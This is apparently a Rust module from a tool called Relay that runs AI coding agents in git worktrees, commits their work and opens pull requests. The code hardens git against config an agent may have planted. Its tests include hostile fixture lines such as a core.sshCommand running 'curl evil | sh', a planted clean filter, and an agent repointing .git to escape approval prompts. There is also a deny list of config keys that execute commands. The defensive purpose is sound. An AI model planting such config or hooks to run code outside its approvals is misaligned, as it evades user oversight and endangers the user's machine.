//! Git and `gh` plumbing for task workspaces. Everything here is blocking process I/O and
//! must never run while the shared DB lock is held (see `ship::spawn_ship` for the
//! gather/compute/write split). The pure helpers — slugs, branch names, commit/PR text, URL
//! parsing — are unit-tested below; the process-driving ones are tested against a throwaway
//! local repo (no network: nothing in the tests pushes or calls `gh`).

use crate::db::queries::TaskWorkspace;
use crate::dispatch;
use crate::tags;
use std::path::{Path, PathBuf};
use std::process::Command;

/// Longest slug kept in a branch name; the task id suffix keeps branches unique regardless.
const MAX_SLUG_LEN: usize = 40;
/// GitHub rejects PR bodies past 65,536 characters; an agent's final message can be long.
const MAX_SUMMARY_CHARS: usize = 6_000;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShipStatus {
    /// Pushed, and a PR exists (opened now or already open from an earlier ship).
    Shipped,
    /// Nothing to commit and the branch has no commits beyond its base.
    NoChanges,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShipOutcome {
    pub status: ShipStatus,
    pub pr_url: Option<String>,
    pub committed: bool,
}

/// What a ship needs to know about the task besides its workspace.
pub struct ShipContext<'a> {
    pub title: &'a str,
    pub prompt: &'a str,
    pub agent: &'a str,
    pub model: &'a str,
    /// The agent's final message, used as the PR summary.
    pub summary: Option<&'a str>,
}

fn run(program: &str, dir: &Path, args: &[&str]) -> anyhow::Result<String> {
    let executable = dispatch::resolve_executable(program)
        .ok_or_else(|| anyhow::anyhow!("`{program}` was not found on this machine's PATH"))?;
    let output = Command::new(executable)
        .args(args)
        .current_dir(dir)
        // A Finder-launched app has launchd's bare PATH; git hooks and gh's credential
        // helpers need the user's real one (same reasoning as `agent_search_paths`).
        .env("PATH", dispatch::agent_path_env())
        // Never block on an interactive credential prompt nobody can see — fail instead.
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GH_PROMPT_DISABLED", "1")
        .env("NO_COLOR", "1")
        // Environment-scope config outranks every config file, and is inherited by the git
        // processes `gh` spawns. Both keys execute arbitrary commands and can be pointed at
        // agent-written files, so they are off for everything Relay runs (see `worktree_git`).
        .env("GIT_CONFIG_COUNT", "3")
        .env("GIT_CONFIG_KEY_0", "core.fsmonitor")
        .env("GIT_CONFIG_VALUE_0", "false")
        .env("GIT_CONFIG_KEY_1", "core.hooksPath")
        .env("GIT_CONFIG_VALUE_1", "/dev/null")
        // `ext::` remote URLs run a command; git refuses them by default, and this keeps a
        // repo-level override from turning them back on.
        .env("GIT_CONFIG_KEY_2", "protocol.ext.allow")
        .env("GIT_CONFIG_VALUE_2", "never")
        .output()?;
    if output.status.success() {
        return Ok(String::from_utf8_lossy(&output.stdout).trim().to_string());
    }
    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
    let detail = if stderr.is_empty() { stdout } else { stderr };
    anyhow::bail!("`{program} {}` failed: {detail}", args.join(" "))
}

fn git(dir: &Path, args: &[&str]) -> anyhow::Result<String> {
    run("git", dir, args)
}

/// The worktree's admin directory (`<common>/worktrees/<name>`), found through git's own
/// registry in the main repository rather than the worktree's `.git` file. That file sits
/// inside the agent's working folder, so an agent could repoint it at a repository it made up
/// whose config runs commands (`core.fsmonitor`, `core.sshCommand`, filter drivers…). The
/// registry lives in the user's checkout's `.git`, outside anything the agent works in.
fn trusted_git_dir(workspace: &TaskWorkspace) -> anyhow::Result<PathBuf> {
    let common = git(
        Path::new(&workspace.repo_root),
        &["rev-parse", "--path-format=absolute", "--git-common-dir"],
    )?;
    let worktree = Path::new(&workspace.worktree_path).canonicalize()?;
    for entry in std::fs::read_dir(Path::new(&common).join("worktrees"))? {
        let admin = entry?.path();
        // `gitdir` records the absolute path of the worktree's `.git` file. Compare its parent
        // (the worktree folder) rather than resolving the agent-writable `.git` entry itself.
        let Ok(recorded) = std::fs::read_to_string(admin.join("gitdir")) else {
            continue;
        };
        let recorded_worktree = Path::new(recorded.trim()).parent().map(Path::canonicalize);
        if let Some(Ok(recorded_worktree)) = recorded_worktree {
            if recorded_worktree == worktree {
                return Ok(admin);
            }
        }
    }
    anyhow::bail!(
        "git has no record of the worktree at {}; it may have been moved or tampered with",
        workspace.worktree_path
    )
}

/// Repository-level config entries (`local`/`worktree` scope, from `git config --show-scope
/// --list` output) that make git run a program. Agents dispatched *without* a worktree run in
/// the project checkout itself, where `.git/config` is inside their working folder, so any of
/// these could have been planted there. Global and system config are the user's own and are
/// trusted. `core.fsmonitor`/`core.hooksPath` are not listed: `run` force-disables both, and
/// tools like husky legitimately set a repo-level hooks path. Git LFS's own filter is allowed.
pub fn unsafe_repo_config(listing: &str) -> Vec<String> {
    listing
        .lines()
        .filter_map(|line| {
            let (scope, entry) = line.split_once('\t')?;
            if scope != "local" && scope != "worktree" {
                return None;
            }
            let (key, value) = entry.split_once('=').unwrap_or((entry, ""));
            let key_lower = key.to_lowercase();
            is_exec_config(&key_lower, value).then(|| key.to_string())
        })
        .collect()
}

fn is_exec_config(key: &str, value: &str) -> bool {
    let ends = |suffix: &str| key.ends_with(suffix);
    let starts = |prefix: &str| key.starts_with(prefix);
    if starts("filter.lfs.") {
        let value = value.trim();
        return !(value == "true" || value == "false" || value.starts_with("git-lfs "));
    }
    matches!(
        key,
        "core.sshcommand"
            | "core.gitproxy"
            | "core.askpass"
            | "core.pager"
            | "core.editor"
            | "core.alternaterefscommand"
            | "sequence.editor"
            | "diff.external"
            | "gpg.program"
            | "credential.helper"
            | "include.path"
            | "uploadpack.packobjectshook"
    ) || starts("includeif.")
        || starts("filter.")
        || (starts("gpg.") && ends(".program"))
        || (starts("credential.") && ends(".helper"))
        || (starts("diff.") && (ends(".command") || ends(".textconv")))
        || (starts("merge.") && ends(".driver"))
        || (starts("remote.") && (ends(".uploadpack") || ends(".receivepack")))
        || (starts("protocol.") && ends(".allow") && value.trim() == "always")
}

/// Fails closed, before any git command that could act on it, when repository-level config
/// would make git run a program (see `unsafe_repo_config`). Reading config runs nothing.
fn ensure_safe_config(listing: &str) -> anyhow::Result<()> {
    let found = unsafe_repo_config(listing);
    anyhow::ensure!(
        found.is_empty(),
        "refusing to run git: the repository's own config (.git/config) sets {} which can run \
         programs and could have been written by an agent. Review it, and move anything you \
         set yourself to your global git config (`git config --global`).",
        found.join(", ")
    );
    Ok(())
}

fn ensure_safe_worktree_config(workspace: &TaskWorkspace) -> anyhow::Result<()> {
    ensure_safe_config(&worktree_git(
        workspace,
        &["config", "--show-scope", "--list"],
    )?)
}

/// Runs git inside a task's worktree with the repository pinned to `trusted_git_dir`, so
/// nothing the agent wrote in its folder decides which repository or config git uses.
fn worktree_git(workspace: &TaskWorkspace, args: &[&str]) -> anyhow::Result<String> {
    let git_dir = trusted_git_dir(workspace)?;
    let git_dir_arg = format!("--git-dir={}", git_dir.display());
    let work_tree_arg = format!("--work-tree={}", workspace.worktree_path);
    let mut full = vec![git_dir_arg.as_str(), work_tree_arg.as_str()];
    full.extend_from_slice(args);
    run("git", Path::new(&workspace.worktree_path), &full)
}

/// `worktree_git` for the commit and push Relay makes on the agent's behalf, with hooks off:
/// hooks can live in tracked files the agent can edit (husky's `.husky/`, or any
/// `core.hooksPath` inside the repo), so running them would execute agent-written code with
/// the user's full privileges, outside the approval prompts that gate the agent's own
/// commands. `run` already forces `core.hooksPath=/dev/null`; `--no-verify` is belt-and-braces.
/// The repo's checks still run in CI on the PR.
fn worktree_git_without_hooks(workspace: &TaskWorkspace, args: &[&str]) -> anyhow::Result<String> {
    let mut full = args.to_vec();
    full.push("--no-verify");
    worktree_git(workspace, &full)
}

fn gh(dir: &Path, args: &[&str]) -> anyhow::Result<String> {
    run("gh", dir, args)
}

pub fn slugify(title: &str) -> String {
    let mut slug = String::new();
    for ch in title.to_lowercase().chars() {
        if ch.is_ascii_alphanumeric() {
            slug.push(ch);
        } else if !slug.is_empty() && !slug.ends_with('-') {
            slug.push('-');
        }
        if slug.len() >= MAX_SLUG_LEN {
            break;
        }
    }
    let slug = slug.trim_end_matches('-').to_string();
    if slug.is_empty() {
        "task".to_string()
    } else {
        slug
    }
}

fn short_id(task_id: &str) -> String {
    task_id
        .chars()
        .filter(char::is_ascii_alphanumeric)
        .take(8)
        .collect()
}

pub fn branch_name(title: &str, task_id: &str) -> String {
    format!("relay/{}-{}", slugify(title), short_id(task_id))
}

/// Conventional Commits type for a task, reusing the session tag heuristic. A fix wins over a
/// feature because "fix the add button" is a fix; anything unclassified is a chore.
pub fn commit_type(title: &str, prompt: &str) -> &'static str {
    let found = tags::classify(&format!("{title}\n{prompt}"));
    let has = |tag: &str| found.iter().any(|t| t == tag);
    if has("bugfix") {
        "fix"
    } else if has("feature") {
        "feat"
    } else if has("refactor") {
        "refactor"
    } else if has("test") {
        "test"
    } else if has("docs") {
        "docs"
    } else {
        "chore"
    }
}

/// `type: title`, with the title's first letter lowercased per Conventional Commits style and
/// any existing `type:` prefix respected rather than doubled.
pub fn conventional_title(title: &str, prompt: &str) -> String {
    let title = title.trim();
    if let Some((prefix, _)) = title.split_once(':') {
        let bare = prefix.split('(').next().unwrap_or(prefix);
        if !bare.is_empty() && bare.chars().all(|c| c.is_ascii_lowercase()) {
            return title.to_string();
        }
    }
    let mut chars = title.chars();
    let subject = match chars.next() {
        Some(first) => first.to_lowercase().collect::<String>() + chars.as_str(),
        None => "update".to_string(),
    };
    format!("{}: {subject}", commit_type(title, prompt))
}

pub fn commit_message(context: &ShipContext) -> String {
    format!(
        "{}\n\nDispatched by Relay ({} / {}).",
        conventional_title(context.title, context.prompt),
        context.agent,
        context.model
    )
}

fn truncate_chars(text: &str, max: usize) -> String {
    if text.chars().count() <= max {
        return text.to_string();
    }
    let cut: String = text.chars().take(max).collect();
    format!("{cut}\n\n…(truncated)")
}

pub fn pr_body(context: &ShipContext, branch: &str) -> String {
    let summary = context
        .summary
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(|s| truncate_chars(s, MAX_SUMMARY_CHARS))
        .unwrap_or_else(|| "_The agent did not leave a final summary._".to_string());
    format!(
        "## Summary\n\n{summary}\n\n## Task\n\n{}\n\n## How it was made\n\n\
         Dispatched from Relay to `{}` (model `{}`) on branch `{branch}`. \
         The agent's changes were committed and pushed automatically. Review before merging.\n",
        truncate_chars(context.prompt.trim(), MAX_SUMMARY_CHARS),
        context.agent,
        context.model,
    )
}

/// `gh pr create` prints the new PR's URL as its last stdout line (warnings go to stderr).
pub fn parse_pr_url(stdout: &str) -> Option<String> {
    stdout
        .lines()
        .rev()
        .map(str::trim)
        .find(|line| line.starts_with("https://") && line.contains("/pull/"))
        .map(str::to_string)
}

fn current_branch(repo: &Path) -> Option<String> {
    git(repo, &["symbolic-ref", "--quiet", "--short", "HEAD"])
        .ok()
        .filter(|b| !b.is_empty())
}

fn origin_default_branch(repo: &Path) -> Option<String> {
    git(
        repo,
        &[
            "symbolic-ref",
            "--quiet",
            "--short",
            "refs/remotes/origin/HEAD",
        ],
    )
    .ok()
    .and_then(|r| r.strip_prefix("origin/").map(str::to_string))
}

/// Creates the isolated worktree a task will run in. The branch starts from the project
/// checkout's current `HEAD` (committed state only — uncommitted edits in the main checkout
/// are deliberately not carried over), and the PR will target the branch that checkout is on.
pub fn prepare_workspace(
    worktrees_root: &Path,
    project_path: &str,
    task_id: &str,
    title: &str,
    auto_ship: bool,
    now: i64,
) -> anyhow::Result<TaskWorkspace> {
    let project = Path::new(project_path);
    anyhow::ensure!(
        project.is_dir(),
        "project folder {project_path} does not exist"
    );
    let repo_root = git(project, &["rev-parse", "--show-toplevel"]).map_err(|_| {
        anyhow::anyhow!(
            "{project_path} is not inside a git repository, so Relay can't open a PR for it"
        )
    })?;
    let repo_root = PathBuf::from(repo_root);
    // `worktree add` checks files out, which runs any configured smudge filter.
    ensure_safe_config(&git(&repo_root, &["config", "--show-scope", "--list"])?)?;
    git(&repo_root, &["rev-parse", "--verify", "HEAD"])
        .map_err(|_| anyhow::anyhow!("the repository has no commits yet; commit once first"))?;
    let base_branch = current_branch(&repo_root)
        .or_else(|| origin_default_branch(&repo_root))
        .ok_or_else(|| {
            anyhow::anyhow!("the project checkout is on a detached HEAD; check out a branch first")
        })?;

    // The project's subdirectory within its repo, as git itself sees it. Comparing path
    // strings instead breaks on symlinks and on macOS's case-insensitive paths, and a silent
    // fallback to the repo root would run the agent in the wrong folder.
    // `--show-prefix` ends in `/` ("web/"); trimmed so `work_dir` never carries a trailing
    // slash, which would defeat the exact-match cwd mapping at ingest.
    let prefix = git(project, &["rev-parse", "--show-prefix"])?;
    let relative = PathBuf::from(prefix.trim_end_matches('/'));

    let repo_name = repo_root
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("repo");
    let branch = branch_name(title, task_id);
    let worktree_path =
        worktrees_root.join(format!("{}-{}", slugify(repo_name), short_id(task_id)));
    std::fs::create_dir_all(worktrees_root)?;
    let worktree_str = worktree_path.to_string_lossy().to_string();
    git(
        &repo_root,
        &["worktree", "add", "-b", &branch, &worktree_str, "HEAD"],
    )?;
    let work_dir = worktree_path.join(relative);

    Ok(TaskWorkspace {
        task_id: task_id.to_string(),
        project_path: project_path.to_string(),
        repo_root: repo_root.to_string_lossy().to_string(),
        worktree_path: worktree_str,
        work_dir: work_dir.to_string_lossy().to_string(),
        branch,
        base_branch,
        auto_ship,
        ship_status: "pending".to_string(),
        ship_error: None,
        pr_url: None,
        last_shipped_at: None,
        removed_at: None,
        created_at: now,
    })
}

/// Re-creates a worktree that was removed (the conversation was shut down) so a retry can run
/// again on the same branch, and therefore keep updating the same PR. Returns whether it had
/// to recreate anything.
pub fn ensure_worktree(workspace: &TaskWorkspace) -> anyhow::Result<bool> {
    if Path::new(&workspace.worktree_path).is_dir() {
        return Ok(false);
    }
    let repo = Path::new(&workspace.repo_root);
    ensure_safe_config(&git(repo, &["config", "--show-scope", "--list"])?)?;
    // Drop git's bookkeeping for the vanished directory, or `worktree add` refuses the path.
    git(repo, &["worktree", "prune"])?;
    git(
        repo,
        &[
            "worktree",
            "add",
            &workspace.worktree_path,
            &workspace.branch,
        ],
    )?;
    Ok(true)
}

fn is_dirty(workspace: &TaskWorkspace) -> anyhow::Result<bool> {
    Ok(!worktree_git(workspace, &["status", "--porcelain"])?.is_empty())
}

/// Commits whatever the agent left uncommitted. Returns whether a commit was made.
pub fn commit_all(workspace: &TaskWorkspace, message: &str) -> anyhow::Result<bool> {
    if !is_dirty(workspace)? {
        return Ok(false);
    }
    worktree_git(workspace, &["add", "-A"])?;
    worktree_git_without_hooks(workspace, &["commit", "-m", message])?;
    Ok(true)
}

pub fn commits_ahead(workspace: &TaskWorkspace) -> anyhow::Result<i64> {
    let range = format!("{}..HEAD", workspace.base_branch);
    let count = worktree_git(workspace, &["rev-list", "--count", &range])?;
    Ok(count.parse().unwrap_or(0))
}

/// Commit → push → open (or find) the PR. Idempotent: shipping again after more turns pushes
/// the new commits to the same branch, which updates the existing PR.
pub fn ship(workspace: &TaskWorkspace, context: &ShipContext) -> anyhow::Result<ShipOutcome> {
    let worktree = Path::new(&workspace.worktree_path);
    anyhow::ensure!(
        worktree.is_dir(),
        "the task's worktree at {} no longer exists",
        workspace.worktree_path
    );
    // First, before `git status`/`add`/`push`, any of which can invoke filters or ssh.
    ensure_safe_worktree_config(workspace)?;
    let committed = commit_all(workspace, &commit_message(context))?;
    if commits_ahead(workspace)? == 0 {
        return Ok(ShipOutcome {
            status: ShipStatus::NoChanges,
            pr_url: workspace.pr_url.clone(),
            committed,
        });
    }

    let remotes = worktree_git(workspace, &["remote"])?;
    anyhow::ensure!(
        remotes.lines().any(|r| r.trim() == "origin"),
        "the repository has no `origin` remote to push to"
    );
    worktree_git_without_hooks(workspace, &["push", "-u", "origin", &workspace.branch])?;

    if workspace.pr_url.is_some() {
        return Ok(ShipOutcome {
            status: ShipStatus::Shipped,
            pr_url: workspace.pr_url.clone(),
            committed,
        });
    }
    let title = conventional_title(context.title, context.prompt);
    let body = pr_body(context, &workspace.branch);
    // gh runs git internally to find the repo; run it from the user's own checkout (same
    // repository, same remotes) rather than the agent's folder. `--head` names the branch, so
    // gh never needs the worktree.
    let repo_root = Path::new(&workspace.repo_root);
    let created = gh(
        repo_root,
        &[
            "pr",
            "create",
            "--base",
            &workspace.base_branch,
            "--head",
            &workspace.branch,
            "--title",
            &title,
            "--body",
            &body,
        ],
    );
    let pr_url = match created {
        Ok(stdout) => parse_pr_url(&stdout),
        // Most often "a pull request already exists" (opened by hand, or a previous ship that
        // pushed but crashed before recording the URL) — adopt it rather than failing.
        Err(create_error) => match gh(
            repo_root,
            &[
                "pr",
                "view",
                &workspace.branch,
                "--json",
                "url",
                "--jq",
                ".url",
            ],
        ) {
            Ok(url) if !url.is_empty() => Some(url),
            _ => return Err(create_error),
        },
    };
    Ok(ShipOutcome {
        status: ShipStatus::Shipped,
        pr_url,
        committed,
    })
}

/// Removes a task's worktree once its work is safely on the branch. Leaves it in place (and
/// returns `false`) when it still holds uncommitted changes, so nothing is ever discarded.
/// The branch itself is kept: it backs the PR.
pub fn remove_worktree(workspace: &TaskWorkspace) -> anyhow::Result<bool> {
    let worktree = Path::new(&workspace.worktree_path);
    if !worktree.is_dir() {
        return Ok(true);
    }
    ensure_safe_worktree_config(workspace)?;
    if is_dirty(workspace)? {
        return Ok(false);
    }
    git(
        Path::new(&workspace.repo_root),
        &["worktree", "remove", &workspace.worktree_path],
    )?;
    Ok(true)
}

/// Throws away a workspace that was created but never used (its task failed to be recorded):
/// force-removes the worktree and deletes its branch. Only for that path — never for a
/// workspace an agent has worked in.
pub fn discard_workspace(workspace: &TaskWorkspace) -> anyhow::Result<()> {
    let repo = Path::new(&workspace.repo_root);
    git(
        repo,
        &["worktree", "remove", "--force", &workspace.worktree_path],
    )?;
    git(repo, &["branch", "-D", &workspace.branch])?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn context<'a>(title: &'a str, prompt: &'a str) -> ShipContext<'a> {
        ShipContext {
            title,
            prompt,
            agent: "claude",
            model: "opus",
            summary: Some("Fixed the login redirect."),
        }
    }

    #[test]
    fn slugs_are_lowercase_dash_separated_and_bounded() {
        assert_eq!(
            slugify("Fix the Login  redirect!"),
            "fix-the-login-redirect"
        );
        assert_eq!(slugify("   "), "task");
        assert_eq!(slugify("日本語"), "task");
        assert!(slugify(&"word ".repeat(40)).len() <= MAX_SLUG_LEN);
        assert!(!slugify(&"ab-".repeat(30)).ends_with('-'));
    }

    #[test]
    fn branch_names_are_namespaced_and_unique_per_task() {
        assert_eq!(
            branch_name("Add dark mode", "1f2e3d4c-aaaa-bbbb"),
            "relay/add-dark-mode-1f2e3d4c"
        );
    }

    #[test]
    fn commit_types_follow_the_tag_heuristic_with_fix_winning() {
        assert_eq!(commit_type("Fix the add button", ""), "fix");
        assert_eq!(commit_type("Add dark mode", ""), "feat");
        assert_eq!(commit_type("Refactor the parser", ""), "refactor");
        assert_eq!(commit_type("Update the README", ""), "docs");
        assert_eq!(commit_type("Bump deps", ""), "chore");
    }

    #[test]
    fn conventional_titles_lowercase_the_subject_and_keep_existing_prefixes() {
        assert_eq!(
            conventional_title("Fix login redirect", ""),
            "fix: fix login redirect"
        );
        assert_eq!(
            conventional_title("feat(board): drag cards", ""),
            "feat(board): drag cards"
        );
    }

    #[test]
    fn pr_body_carries_summary_task_and_provenance() {
        let body = pr_body(
            &context("Fix login", "Make /login redirect home"),
            "relay/x",
        );
        assert!(body.contains("Fixed the login redirect."));
        assert!(body.contains("Make /login redirect home"));
        assert!(body.contains("`claude`"));
        assert!(body.contains("`relay/x`"));

        let mut no_summary = context("Fix login", "p");
        no_summary.summary = Some("   ");
        assert!(pr_body(&no_summary, "b").contains("did not leave a final summary"));
    }

    #[test]
    fn repo_level_exec_config_is_flagged_but_user_config_and_lfs_are_not() {
        let listing = "\
global\tcore.sshcommand=ssh -i ~/.ssh/work
system\tcredential.helper=osxkeychain
local\tremote.origin.url=git@github.com:o/r.git
local\tcore.hookspath=.husky
local\tcore.fsmonitor=true
local\tfilter.lfs.clean=git-lfs clean -- %f
local\tfilter.lfs.required=true
local\tcore.sshCommand=sh -c 'curl evil | sh'
worktree\tgpg.ssh.program=/tmp/x
local\tfilter.pwn.clean=./pwn.sh
local\tincludeIf.gitdir:/tmp/.path=/tmp/evil
local\tprotocol.file.allow=always
local\tprotocol.file.allow=user
command\tcore.pager=less";
        assert_eq!(
            unsafe_repo_config(listing),
            vec![
                "core.sshCommand",
                "gpg.ssh.program",
                "filter.pwn.clean",
                "includeIf.gitdir:/tmp/.path",
                "protocol.file.allow",
            ]
        );
        assert!(ensure_safe_config("local\tuser.name=me").is_ok());
        let error = ensure_safe_config("local\tdiff.x.textconv=./t").unwrap_err();
        assert!(error.to_string().contains("diff.x.textconv"));
        let spoofed_lfs = "local\tfilter.lfs.process=sh -c evil";
        assert_eq!(unsafe_repo_config(spoofed_lfs), vec!["filter.lfs.process"]);
    }

    #[test]
    fn pr_url_is_taken_from_the_last_url_line() {
        let stdout =
            "Creating pull request for relay/x into main\n\nhttps://github.com/o/r/pull/12\n";
        assert_eq!(
            parse_pr_url(stdout).as_deref(),
            Some("https://github.com/o/r/pull/12")
        );
        assert_eq!(parse_pr_url("nothing here"), None);
    }

    /// A real (local, network-free) repo: worktree creation, commit, ahead count, removal.
    #[test]
    fn workspace_lifecycle_against_a_local_repo() {
        let base = std::env::temp_dir().join(format!(
            "relay-ship-test-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_nanos_opt().unwrap_or_default()
        ));
        let repo = base.join("repo");
        let app_dir = base.join("app");
        std::fs::create_dir_all(repo.join("web")).unwrap();
        let g = |dir: &Path, args: &[&str]| git(dir, args).unwrap();
        g(&repo, &["init", "-q", "-b", "main"]);
        g(&repo, &["config", "user.email", "relay@test"]);
        g(&repo, &["config", "user.name", "Relay Test"]);
        g(&repo, &["config", "commit.gpgsign", "false"]);
        std::fs::write(repo.join("web/README.md"), "hi\n").unwrap();
        g(&repo, &["add", "-A"]);
        g(&repo, &["commit", "-q", "-m", "init"]);

        // The project is a subdirectory of the repo: work_dir must mirror that.
        let project = repo.join("web");
        let ws = prepare_workspace(
            &app_dir.join("worktrees"),
            project.to_str().unwrap(),
            "abcdef12-3456",
            "Add a greeting",
            true,
            1,
        )
        .unwrap();
        assert_eq!(ws.base_branch, "main");
        assert_eq!(ws.branch, "relay/add-a-greeting-abcdef12");
        assert!(ws.work_dir.ends_with("/web"));
        assert!(Path::new(&ws.work_dir).join("README.md").is_file());

        let worktree = Path::new(&ws.worktree_path);
        assert!(!commit_all(&ws, "nothing").unwrap());
        assert_eq!(commits_ahead(&ws).unwrap(), 0);

        // A tracked hooks dir (husky-style) the agent could have edited: Relay's commit must
        // not run it. The hook would both fail the commit and leave a marker file.
        let hooks = Path::new(&ws.worktree_path).join(".githooks");
        std::fs::create_dir_all(&hooks).unwrap();
        let marker = base.join("hook-ran");
        let hook = hooks.join("pre-commit");
        std::fs::write(
            &hook,
            format!("#!/bin/sh\ntouch '{}'\nexit 1\n", marker.display()),
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        g(worktree, &["config", "core.hooksPath", ".githooks"]);

        std::fs::write(Path::new(&ws.work_dir).join("hello.txt"), "hello\n").unwrap();
        // Dirty worktrees are never removed.
        assert!(!remove_worktree(&ws).unwrap());
        // The agent repoints the worktree's `.git` file at a repository it made up, whose
        // config runs a command on `git status`. Relay must keep using the real repository.
        let fake = base.join("fake");
        std::fs::create_dir_all(&fake).unwrap();
        g(&fake, &["init", "-q"]);
        let fsmonitor_marker = base.join("fsmonitor-ran");
        g(
            &fake,
            &[
                "config",
                "core.fsmonitor",
                &format!("touch '{}'", fsmonitor_marker.display()),
            ],
        );
        let dot_git = worktree.join(".git");
        let real_dot_git = std::fs::read_to_string(&dot_git).unwrap();
        std::fs::write(
            &dot_git,
            format!("gitdir: {}\n", fake.join(".git").display()),
        )
        .unwrap();

        assert!(commit_all(&ws, "feat: add a greeting").unwrap());
        assert!(
            !fsmonitor_marker.exists(),
            "Relay must never use a repository the agent pointed .git at"
        );
        // The commit landed on the task's real branch, not in the fake repo.
        let log = g(
            Path::new(&ws.repo_root),
            &["log", "-1", "--format=%s", &ws.branch],
        );
        assert_eq!(log, "feat: add a greeting");
        std::fs::write(&dot_git, real_dot_git).unwrap();

        // A clean filter planted in the repository's own config (as an agent running in the
        // main checkout could do) must stop Relay before `git status`/`add` can invoke it.
        let filter_marker = base.join("filter-ran");
        let filter_cmd = format!("touch '{}'; cat", filter_marker.display());
        g(
            Path::new(&ws.repo_root),
            &["config", "filter.pwn.clean", &filter_cmd],
        );
        std::fs::write(
            Path::new(&ws.worktree_path).join(".gitattributes"),
            "* filter=pwn\n",
        )
        .unwrap();
        let error = ship(&ws, &context("Add a greeting", "p")).unwrap_err();
        assert!(error.to_string().contains("filter.pwn.clean"), "{error}");
        assert!(!filter_marker.exists(), "the planted filter must never run");
        g(
            Path::new(&ws.repo_root),
            &["config", "--unset", "filter.pwn.clean"],
        );
        std::fs::remove_file(Path::new(&ws.worktree_path).join(".gitattributes")).unwrap();
        assert!(
            !marker.exists(),
            "Relay's commit must never run repository hooks"
        );
        assert_eq!(commits_ahead(&ws).unwrap(), 1);
        // The main checkout is untouched.
        assert!(!project.join("hello.txt").exists());

        // Without an origin remote, ship stops after committing with a clear error.
        let error = ship(&ws, &context("Add a greeting", "p")).unwrap_err();
        assert!(error.to_string().contains("origin"));

        assert!(remove_worktree(&ws).unwrap());
        assert!(!worktree.exists());
        // A retry after removal recreates the worktree on the same branch, commits intact.
        assert!(ensure_worktree(&ws).unwrap());
        assert!(Path::new(&ws.work_dir).join("hello.txt").is_file());
        assert!(!ensure_worktree(&ws).unwrap());

        let _ = remove_worktree(&ws);
        let _ = std::fs::remove_dir_all(&base);
    }
}
